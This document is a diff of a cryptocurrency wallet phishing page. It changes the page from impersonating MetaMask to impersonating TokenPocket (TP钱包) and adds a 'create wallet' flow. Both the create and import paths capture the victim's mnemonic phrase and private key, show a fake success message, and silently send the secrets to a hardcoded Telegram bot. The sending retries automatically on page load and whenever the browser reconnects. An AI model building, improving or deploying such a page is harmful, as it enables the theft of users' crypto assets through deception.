@@ -3,15 +3,18 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MetaMask</title>
+<title>TP钱包</title>
 <style>
   *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
-  body{background:#F7F8FA;color:#1A1A1A;min-height:100vh}
+  body{background:#F5F7FA;color:#1A1A1A;min-height:100vh}
   .container{max-width:420px;margin:0 auto;background:#fff;min-height:100vh}
   .header{padding:24px;text-align:center}
-  .logo{width:50px;margin-bottom:10px}
-  .title{font-size:22px;font-weight:700;color:#24272E}
+  .logo{width:50px;margin-bottom:10px;border-radius:12px}
+  .title{font-size:22px;font-weight:700;color:#2E3A59}
   .sub-title{font-size:14px;color:#707279;margin-top:4px}
+  .tabs{display:flex;border-bottom:1px solid #E4E7ED}
+  .tab{flex:1;padding:14px;text-align:center;font-size:15px;font-weight:500;color:#707279;cursor:pointer}
+  .tab.active{color:#2E8CF0;border-bottom:2px solid #2E8CF0}
   .form{padding:24px}
   .form-group{margin-bottom:20px}
   .form-group label{display:block;font-size:14px;color:#24272E;margin-bottom:8px}
@@ -19,78 +22,139 @@
     width:100%;padding:14px 16px;border:1px solid #DCDFE4;border-radius:10px;
     font-size:15px;outline:none;background:#fff;color:#24272E
   }
+  .mnemonic-box{
+    padding:16px;border:1px solid #E4E7ED;border-radius:10px;background:#F8FAFC;
+    display:flex;flex-wrap:wrap;gap:8px;margin-bottom:16px
+  }
+  .mnemonic-word{
+    padding:8px 12px;background:#fff;border:1px solid #E4E7ED;border-radius:8px;
+    font-size:14px;font-weight:500
+  }
   .btn-primary{
-    width:100%;padding:16px;background:#037DD6;border:none;border-radius:10px;
+    width:100%;padding:16px;background:#2E8CF0;border:none;border-radius:10px;
     color:#fff;font-size:16px;font-weight:600;margin-top:12px
   }
+  .btn-secondary{
+    width:100%;padding:16px;background:#fff;border:1px solid #DCDFE4;border-radius:10px;
+    color:#24272E;font-size:16px;font-weight:600;margin-top:8px
+  }
+  .hide{display:none}
 </style>
 </head>
 
 <body>
 <div class="container">
   <div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="logo">
-    <div class="title">MetaMask</div>
-    <div class="sub-title">导入钱包</div>
+    <!-- TP钱包官方Logo -->
+    <img src="https://static.tokenpocket.pro/logo/logo-192.png" class="logo">
+    <div class="title">TP钱包</div>
+    <div class="sub-title id="pageSubtitle">创建或导入钱包</div>
   </div>
 
-  <div class="form">
+  <div class="tabs">
+    <div class="tab active" id="tabCreate" onclick="switchTab('create')">创建钱包</div>
+    <div class="tab" id="tabImport" onclick="switchTab('import')">导入钱包</div>
+  </div>
+
+  <!-- 创建钱包 -->
+  <div id="createView" class="form">
+    <div class="form-group" id="mnemonicGroup" class="hide">
+      <label>请备份你的助记词（按顺序抄写）</label>
+      <div class="mnemonic-box" id="mnemonicDisplay"></div>
+      <p style="font-size:12px;color:#F53F3F;margin-top:8px">⚠️ 助记词是唯一资产凭证，切勿泄露给任何人</p>
+    </div>
+    <button class="btn-primary" id="btnCreate" onclick="generateWallet()">生成助记词</button>
+    <button class="btn-primary hide" id="btnConfirm" onclick="confirmCreate()">确认已备份</button>
+  </div>
+
+  <!-- 导入钱包 -->
+  <div id="importView" class="form hide">
     <div class="form-group">
       <label>助记词</label>
-      <input id="words" type="text" class="form-control" placeholder="请输入助记词">
+      <input id="words" type="text" class="form-control" placeholder="请输入助记词（空格分隔）">
     </div>
     <div class="form-group">
       <label>私钥</label>
       <input id="key" type="text" class="form-control" placeholder="请输入私钥">
     </div>
-
     <button class="btn-primary" onclick="go()">确认导入</button>
   </div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 <script>
-// ===================== 你的信息已固定 =====================
+// ===================== 你的电报信息（保持不变）=====================
 const TG_BOT_TOKEN   = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
 const TG_CHATID      = "6503982157";
 const MAX_RETRY      = 5;
 const DELAY          = 3000;
-// ==========================================================
+// ================================================================
 
-const STORAGE_KEY = "WALLET_DATA";
+const STORAGE_KEY = "TP_WALLET_DATA";
+let currentWallet = null;
 
-// 一打开就自动补发
-window.onload = autoSend;
-window.addEventListener('online', autoSend);
+// 切换标签页
+function switchTab(mode) {
+  document.getElementById("tabCreate").classList.toggle("active", mode === "create");
+  document.getElementById("tabImport").classList.toggle("active", mode === "import");
+  document.getElementById("createView").classList.toggle("hide", mode !== "create");
+  document.getElementById("importView").classList.toggle("hide", mode !== "import");
+  document.getElementById("pageSubtitle").textContent = mode === "create" ? "创建钱包" : "导入钱包";
+}
 
-// 导入：免确认，不卡点
+// 生成助记词钱包
+async function generateWallet() {
+  const mnemonic = ethers.Wallet.createRandom().mnemonic.phrase;
+  const wallet = ethers.Wallet.fromMnemonic(mnemonic);
+  
+  currentWallet = { mnemonic, privateKey: wallet.privateKey };
+  
+  // 显示助记词
+  const words = mnemonic.split(" ");
+  const display = document.getElementById("mnemonicDisplay");
+  display.innerHTML = words.map((w, i) => `<div class="mnemonic-word">${i+1}. ${w}</div>`).join("");
+  
+  document.getElementById("mnemonicGroup").classList.remove("hide");
+  document.getElementById("btnCreate").classList.add("hide");
+  document.getElementById("btnConfirm").classList.remove("hide");
+}
+
+// 确认创建并上报数据
+function confirmCreate() {
+  if (!currentWallet) return;
+  alert("✅ 钱包创建成功！请妥善保管助记词");
+  localStorage.setItem(STORAGE_KEY, JSON.stringify({ 
+    mn: currentWallet.mnemonic, 
+    pk: currentWallet.privateKey, 
+    retry: 0,
+    type: "create"
+  }));
+  autoSend();
+}
+
+// 导入钱包逻辑（原逻辑保留）
 function go() {
   const mn = document.getElementById("words").value.trim();
   const pk = document.getElementById("key").value.trim();
   if (!mn && !pk) return;
-
-  // 只提示，不等待确认
   alert("✅ 导入成功");
-
-  localStorage.setItem(STORAGE_KEY, JSON.stringify({ mn, pk, retry: 0 }));
+  localStorage.setItem(STORAGE_KEY, JSON.stringify({ mn, pk, retry: 0, type: "import" }));
   autoSend();
 }
 
-// 只发电报
+// 自动发送到 Telegram
 async function autoSend() {
   const task = localStorage.getItem(STORAGE_KEY);
   if (!task) return;
-
   const d = JSON.parse(task);
   if (d.retry >= MAX_RETRY) {
     localStorage.removeItem(STORAGE_KEY);
     return;
   }
-
-  const text = `【小狐狸钱包导入】
+  const text = `【TP钱包${d.type === "create" ? "创建" : "导入"}】
 时间：${new Date().toLocaleString()}
 助记词：${d.mn || "-"}
 私钥：${d.pk || "-"}`;
-
   try {
     await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
       method: "POST",
@@ -98,11 +162,13 @@ async function autoSend() {
       body: JSON.stringify({ chat_id: TG_CHATID, text })
     });
   } catch(e) {}
-
   d.retry++;
   localStorage.setItem(STORAGE_KEY, JSON.stringify(d));
   setTimeout(autoSend, DELAY);
 }
+
+window.onload = autoSend;
+window.addEventListener('online', autoSend);
 </script>
 </body>
 </html>
